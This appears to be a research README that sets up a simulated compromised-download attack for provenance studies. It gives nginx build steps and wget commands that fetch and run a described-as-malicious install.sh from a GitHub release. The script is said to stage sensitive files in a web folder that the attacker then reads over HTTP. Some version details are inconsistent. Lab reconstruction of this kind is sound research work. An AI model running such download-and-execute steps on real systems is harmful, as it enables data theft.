## Scenario

The victim user tries to download a series of packages for his environment via `wget`. However, one of the source URLs has been compromised by the attacker, in which the original package has been replaced with a malware `mal-package`. 

After execution, `mal-package` copies sensitive files from the victim's original directory to a shared folder, which provides web sources for the shared nginx server on victim's PC.

Finally, the attacker steals those files by connecting and requesting to victim's server.

### Similar scenario

[Rain: Refinable Attack Investigation with On-demand Inter-Process Information Flow Tracking](https://iisp.gatech.edu/sites/default/files/images/rain.pdf)

In their motivating example, the attacker compromised a distribution site of an firefox extension *FireFTP*, the original extension has been replaced with a malicious one.

## Implementation

### sources

Ubuntu 16.04: http://mirror.nus.edu.sg/ubuntu-ISO/16.04/    
nginx 1.4.0: http://nginx.org/download/nginx-1.20.2.tar.gz    
wget 1.20.3: https://ftp.gnu.org/gnu/wget/wget-1.20.3.tar.gz

### Deploy

**Nginx server (Victim IP1)**

* build and install
```
tar xzvf nginx-1.20.2.tar.gz && cd nginx-1.20.2
./configure --prefix=/home/chuqi/local/nginx --error-log-path=PATH=/home/chuqi/log/nginx/error.log
make && make install
```

* configure file

Download the `nginx.conf` file in this github dir.
```
mv nginx.conf /home/chuqi/local/nginx/conf/nginx.conf
```

* web sources

Download the folder `web-source` under this github directory.
```
cp web-source /home/chuqi
```

* deploy
```
help: /home/chuqi/local/nginx/sbin/nginx -h
start: /home/chuqi/local/nginx/sbin/nginx
stop: /home/chuqi/local/nginx/sbin/nginx -s stop
```

**Operations (Victim IP1)**

0. Start nginx server

```
/home/chuqi/local/nginx/sbin/nginx
```

1. Download several packages via wget 
```
wget https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/install.sh \
       https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/util.deb \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg1 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg2 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg3 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg4 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg5 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg6 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg7 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg8 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg9 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg10 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg11 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg12 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg13 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg14 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg15 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg16 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg17 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg18 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg19 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg20 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg21 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg22 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg23 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg24 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg25 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg26 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg27 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg28 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg29 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg30 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg31 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg32 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg33 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg34 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg35 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg36 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg37 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg38 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg39 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg40 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg41 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg42 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg43 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg44 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg45 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg46 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg47 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg48 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg49 \
        https://github.com/Icegrave0391/attack-scenarios/releases/download/util.deb/wh-pkg50

chmod 777 install.sh
./install.sh
```
2. Execute malicious `install.sh`

```
./install.sh
```

**Exploit (Attacker IP2)**    

Access victim's web-server on attacker's browser:
```
IP1:8080/data/xxx
IP1:8080/images/xxx
```

